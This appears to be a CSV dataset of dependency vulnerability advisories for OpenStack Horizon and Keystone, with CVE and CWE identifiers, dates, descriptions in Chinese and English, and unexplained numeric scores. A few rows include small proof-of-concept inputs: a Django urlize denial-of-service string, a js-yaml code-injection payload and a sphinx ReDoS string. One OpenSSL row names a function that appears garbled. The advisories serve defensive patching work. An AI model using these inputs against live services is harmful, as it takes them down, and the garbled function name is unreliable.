openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-38875,CWE-130,2024-07-10,该漏洞存在于Django框架中，影响了Django 4.2版本（截至4.2.14之前）和5.0版本（截至5.0.7之前）。漏洞允许远程攻击者通过向`urlize`和`urlizetrunc`函数提供包含大量括号的输入，执行拒绝服务攻击和用户枚举。,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-39614,CWE-130,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0.7之前版本和4.2.14之前版本存在安全漏洞，该漏洞源于get_supported_language_variant()在与包含特定字符的超长字符串一起使用时会遭受拒绝服务攻击。受影响版本如下:5.1版本、5.0版本、4.2版本。",3,1
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-39329,CWE-208,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0版本至5.0.7之前版本、4.2版本至4.2.14之前版本存在安全漏洞，该漏洞源于django.contrib.auth.backends.ModelBackend.authenticate()方法允许远程攻击者通过定时攻击枚举用户。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-45230,CWE-120,2024-09-04,<p>Django 是一个流行的 Python Web 框架，用于高效构建 Web 应用。`urlize` 是 Django 提供的一个实用工具函数，位于 `django.utils.html` 模块中，主要功能是将字符串中可以解释为 URL 的部分自动转换为超链接（HTML 的  标签）。漏洞的根因在于 `urlize` 函数在处理特定重复字符序列（例如 `.;`）时，算法的复杂度未优化，引发性能退化。当输入字符串包含大量重复的特定格式字符时，`urlize` 函数的运行时间会呈指数增长，从而导致拒绝服务（DoS）场景。攻击者可以通过恶意构造的字符串触发此漏洞，例如以下代码：`from django.utils.html import urlize; malicious_input = .; * 100000; urlize(malicious_input)`，结果会使服务器资源耗尽，导致服务不可用。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-24680,CWE-400,2024-02-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务。以下版本受到影响：3.2版本至3.2.24之前版本、4.2版本至4.2.10之前版本、5.0版本至5.0.2之前版本。",2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2023-43665,CWE-1284,2023-10-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞，该漏洞源于文本截断器正则表达式存在线性回溯复杂性问题，导致存在拒绝服务（DoS）漏洞。受影响的产品和版本：Django 5.0版本， 4.2版本，4.1版本，3.2版本。",2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-45231,CWE-203,2024-09-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django v5.1.1版本、v5.0.9版本和v4.2.16版本存在安全漏洞。攻击者利用该漏洞通过发送密码重置请求来枚举用户电子邮件地址。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-57833,CWE-89,2025-09-03,<p>Django 是一个流行的 Python Web 开发框架，提供了高效的 ORM（对象关系映射）功能以简化数据库操作。FilteredRelation 是 Django ORM 中的一种功能，用于在查询中定义过滤关联关系。此漏洞（CVE-2025-57833）涉及 FilteredRelation 的列别名处理，因未对输入的列别名进行充分验证而导致攻击者能够通过构造恶意输入绕过列别名的安全校验，从而实现 SQL 注入攻击。攻击者可以利用该漏洞，通过在 QuerySet.annotate() 或 QuerySet.alias() 方法中传递特制的字典（通过 **kwargs 进行字典展开），插入任意 SQL 命令。此漏洞影响 Django 4.2.24 之前版本、5.1.12 之前版本和 5.2.6 之前版本。</p>,2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-26699,CWE-770,2025-03-06,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.1.7、5.0.13和4.2.20之前版本存在安全漏洞，该漏洞源于django.utils.text.wrap方法和wordwrap模板过滤器在处理非常长的字符串时可能导致拒绝服务攻击。</p>,2,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-56374,CWE-770,2025-01-14,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.1.5版本之前的5.1版本、5.0.11版本之前的5.0版本和4.2.18版本之前的4.2版本存在安全漏洞，该漏洞源于执行IPv6验证时传递的字符串中缺乏上限限制强制执行，可能导致潜在的拒绝服务攻击。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-48432,CWE-117,2025-06-05,<p>Django 是一个流行的基于 Python 的 Web 应用框架，提供快捷方便的开发方式和整洁的设计准则。此漏洞存在于 Django 版本 5.2（早于 5.2.2）、5.1（早于 5.1.10）和 4.2（早于 4.2.22）中。其原因是内部 HTTP 响应日志记录未对 request.path 进行必要的转义，从而允许远程攻击者通过精心设计的 URL 来操纵日志输出。当日志在终端中查看或由外部系统处理时，可能导致日志注入或伪造。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-59682,CWE-23,2025-10-01,Django 是一个广泛使用的 Python Web 开发框架，提供了一系列工具用于快速构建安全且可扩展的 Web 应用程序。其中，django.utils.archive.extract() 函数用于处理归档文件解压操作，并被 'startapp --template' 和 'startproject --template' 命令使用。在 Django 版本 4.2（低于 4.2.25）、5.1（低于 5.1.13）以及 5.2（低于 5.2.7）中，该函数存在一个目录遍历漏洞。攻击者可以通过构造含有共享前缀路径的归档文件，绕过目标目录限制，从而写入或修改目标目录外的文件。漏洞的根本原因在于对归档文件的路径验证不严，未能正确过滤和限制路径。,2,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-59681,CWE-89,2025-10-01,Django 是一个流行的 Python Web 框架，主要用于快速开发 Web 应用和服务。其核心组件 QuerySet 提供了强大的查询构造功能。漏洞涉及 Django 版本 4.2（低于 4.2.25）、5.1（低于 5.1.13）和 5.2（低于 5.2.7）。在使用 QuerySet 的 annotate()、alias()、aggregate() 和 extra() 方法时，如果传递了精心构造的字典参数（通过字典展开 **kwargs），在 MySQL 和 MariaDB 数据库中可能导致 SQL 注入。这是因为这些方法未对列别名进行充分的校验，从而允许恶意用户通过构造字段名称或别名注入恶意 SQL。,3,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-32873,CWE-770,2025-05-08,Django是一个用于快速开发Web应用的高层次Python框架。该框架中的django.utils.html.strip_tags()函数在处理包含大量不完整HTML标签的输入时可能导致性能下降，从而引发拒绝服务问题。,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-64458,CWE-407,2025-11-05,Django 是一个流行的 Python Web 框架，广泛用于开发高效和可扩展的 Web 应用程序。这一漏洞主要影响 Django 框架的 5.1 版本（低于 5.1.14）、4.2 版本（低于 4.2.26）和 5.2 版本（低于 5.2.8）。漏洞的根本原因是 Windows 平台上 Python 的 NFKC 字符归一化功能在处理大量 Unicode 字符时性能较差，导致 `django.http.HttpResponseRedirect`、`django.http.HttpResponsePermanentRedirect` 和 `django.shortcuts.redirect` 方法可能因处理特定构造的输入而受到拒绝服务攻击的影响。攻击者可以利用包含大量 Unicode 字符的输入消耗服务器资源，从而导致服务中断。另外，早期不受支持的 Django 版本（如 5.0.x、4.1.x 和 3.2.x）也可能受到此问题的影响，但尚未经过系统评估。,2,2
openstack_horizon,Pillow,>=9.1.0,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
openstack_horizon,Pillow,>=9.1.0,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
openstack_horizon,Pillow,>=9.1.0,True,CVE-2022-30595,CWE-787,2022-05-17,"Pillow是一款基于Python的图像处理库。
Pillow 9.1.0 版本存在安全漏洞，该漏洞源于在处理TGA文件时存在边界错误。远程攻击者利用该漏洞可以将专门设计的数据传递给应用程序，触发基于堆的缓冲区溢出，并在目标系统上执行任意代码。",2,2
openstack_horizon,Pillow,>=9.1.0,True,,CWE-400,2023-05-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation fault when decoding BLP JPEG compressed CMYK data in BGRX mode.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `pillow` to version 9.4.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/commit/3ec8fa614705ae273426d60f994e3b01bb57a69a)
- [Pillow Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.3.0.html#decode-jpeg-compressed-blp1-data-in-original-mode)
",3,0
openstack_horizon,Pillow,>=9.1.0,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
openstack_horizon,Pillow,>=9.1.0,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
openstack_horizon,Pillow,>=9.1.0,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
openstack_horizon,requests,>=2.25.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_horizon,requests,>=2.25.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_horizon,requests,>=2.25.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_horizon,async,1.5.2,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
openstack_horizon,eslint,3.0.0,True,,,2021-02-25,A vulnerability was descovered in eslint before 4.18.2. One of the regexes in eslint is vulnerable to catastrophic backtracking.,3,-2
openstack_horizon,shelljs,0.6.1,False,,CWE-269,2022-01-15,"### Impact
Output from the synchronous version of `shell.exec()` may be visible to other users on the same system. You may be affected if you execute `shell.exec()` in multi-user Mac, Linux, or WSL environments, or if you execute `shell.exec()` as the root user.

Other shelljs functions (including the asynchronous version of `shell.exec()`) are not impacted.

### Patches
Patched in shelljs 0.8.5

### Workarounds
Recommended action is to upgrade to 0.8.5.

### References
https://huntr.dev/bounties/50996581-c08e-4eed-a90e-c0bac082679c/

### For more information
If you have any questions or comments about this advisory:
* Ask at https://github.com/shelljs/shelljs/issues/1058
* Open an issue at https://github.com/shelljs/shelljs/issues/new
",3,-2
openstack_horizon,ua-parser-js,0.7.22,False,,,,<p>ua-parser-js 是一个用于检测用户代理字符串的 JavaScript 库，旨在提供用户设备和浏览器的信息。该库存在一个效率低下的正则表达式，导致多项式的执行时间（虽然不是指数级的，但仍然危险）。攻击者可以使用特定的载荷来触发这一问题，执行时间可能超过2.5秒。可以通过 `Regexr` 在线检查相关载荷。两个载荷的比较分别为：载荷1 (https://regexr.com/65o79) 和载荷2 (https://regexr.com/65o7c)。</p>,3,1
openstack_horizon,ua-parser-js,0.7.22,False,,,,<p>ua-parser-js 是一个用 JavaScript 编写的库，旨在分析用户代理字符串并提取浏览器、引擎、操作系统、CPU 和设备信息。该库中的一个正则表达式表现出多项式执行时间，虽然没有呈现指数增长，但仍然存在潜在的安全风险。该漏洞源于在处理正则表达式时未能优化其性能，导致在某些输入情况下可能出现严重的延迟。攻击者可以构造特定的输入字符串，导致正则表达式处理时间显著增长，从而影响应用性能。</p>,3,1
openstack_horizon,ua-parser-js,0.7.22,False,,,,<p>ua-parser-js 是一个用于解析用户代理字符串的 JavaScript 库。该库在处理正则表达式时存在一个低效正则表达式，可能导致多项式执行时间。这种执行时间虽然不是指数级的，但仍然可能对性能造成严重影响。该漏洞的根本原因是正则表达式的设计，使得某些输入情况下执行时间显著增加。攻击者可以利用这一现象，通过构造特定的输入串来导致应用程序在处理这些正则表达式时出现延迟，甚至造成拒绝服务 (DoS)。</p>,3,1
openstack_horizon,cookie,0.4.2,False,CVE-2024-47764,CWE-74,2024-10-04,"cookie是jshttp开源的一个 HTTP 服务器 cookie 解析和序列化库。
cookie 0.7.0之前版本存在安全漏洞，该漏洞源于允许攻击者通过操纵cookie名称来设置cookie的其他字段，导致意外的cookie值。",3,2
openstack_horizon,tmp,0.2.1,False,CVE-2025-54798,CWE-59,2025-08-07,tmp 是一个用于 Node.js 的临时文件和目录创建库。该漏洞存在于 tmp 组件 0.2.3 版本，主要由于 `_resolvePath` 函数未正确处理符号链接（symlink）路径解析，导致攻击者能够通过 `dir` 参数创建指向系统默认临时目录（tmpDir）外部的符号链接目录，从而绕过路径检查逻辑。具体来说，攻击者可以利用符号链接指向 tmpDir 外部的目录，触发 `_assertIsRelative` 检查失效，进而在未经授权的目录中创建临时文件或目录。该漏洞根本原因是组件缺乏对路径解析中符号链接的验证。,3,0
openstack_horizon,js-yaml,3.3.1,False,,CWE-400,2019-06-05,"Versions of `js-yaml` prior to 3.13.0 are vulnerable to Denial of Service. By parsing a carefully-crafted YAML file, the node process stalls and may exhaust system resources leading to a Denial of Service.


## Recommendation

Upgrade to version 3.13.0.",3,0
openstack_horizon,js-yaml,3.3.1,False,,CWE-94,2019-06-05,"Versions of `js-yaml` prior to 3.13.1 are vulnerable to Code Injection. The `load()` function may execute arbitrary code injected through a malicious YAML file. Objects that have `toString` as key, JavaScript code as value and are used as explicit mapping keys allow attackers to execute the supplied code through the `load()` function. The `safeLoad()` function is unaffected.

An example payload is 
`{ toString: !<tag:yaml.org,2002:js/function> 'function (){return Date.now()}' } : 1` 
which returns the object 
{
  ""1553107949161"": 1
}


## Recommendation

Upgrade to version 3.13.1.",2,-2
openstack_keystone,sphinx,">=2.0.0,!=2.1.0",True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_keystone,sphinx,">=2.0.0,!=2.1.0",True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_keystone,sphinx,">=2.0.0,!=2.1.0",True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_keystone,sphinx,">=2.0.0,!=2.1.0",True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_keystone,python-ldap,>=3.0.0,True,,CWE-1333,2021-11-30,"https://github.com/python-ldap/python-ldap/issues/424

### Impact
The LDAP schema parser of python-ldap 3.3.1 and earlier are vulnerable to a regular expression denial-of-service attack. The issue affects clients that use ``ldap.schema`` package to parse LDAP schema definitions from an untrusted source.

### Patches
The upcoming release of python-ldap 3.4.0 will contain a workaround to prevent ReDoS attacks. The schema parser refuses schema definitions with an excessive amount of backslashes.

### Workarounds
As a workaround, users can check input for excessive amount of backslashes in schemas. More than a dozen backslashes per line are atypical.

### References
[CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [python-ldap](https://github.com/python-ldap/python-ldap) tracker
",3,0
openstack_keystone,python-ldap,>=3.0.0,True,CVE-2021-46823,CWE-1333,2021-11-30,"python-ldap是python-ldap开源的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.0之前版本存在安全漏洞，该漏洞源于 LDAP 模式解析器中存在正则表达式拒绝服务 (ReDoS) 缺陷。攻击者利用该漏洞通过发送特制的正则表达式输入导致拒绝服务。",3,0
openstack_keystone,python-ldap,>=3.0.0,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
openstack_keystone,python-ldap,>=3.0.0,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
openstack_keystone,WebOb,>=1.7.1,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_keystone,Flask,"!=0.11,>=1.0.2",True,CVE-2018-1000656,CWE-20,2018-08-20,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Pallets Project flask 0.12.3之前版本中存在输入验证漏洞。攻击者可借助JSON数据利用该漏洞造成拒绝服务（大量内存消耗）。",2,2
openstack_keystone,Flask,"!=0.11,>=1.0.2",True,CVE-2023-30861,CWE-539,2023-05-02,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Flask存在安全漏洞，该漏洞源于用于一个客户端的数据响应可能会被缓存并随后由代理发送给其他客户端。",2,1
openstack_keystone,Flask,"!=0.11,>=1.0.2",True,CVE-2019-1010083,CWE-20,2019-07-17,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Pallets Project Flask 1.0之前版本中存在资源管理错误漏洞。攻击者可借助特制的被编码的JSON输入利用该漏洞造成拒绝服务。",2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_keystone,cryptography,>=2.7,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_keystone,cryptography,>=2.7,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_keystone,cryptography,>=2.7,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_keystone,cryptography,>=2.7,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_keystone,cryptography,>=2.7,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
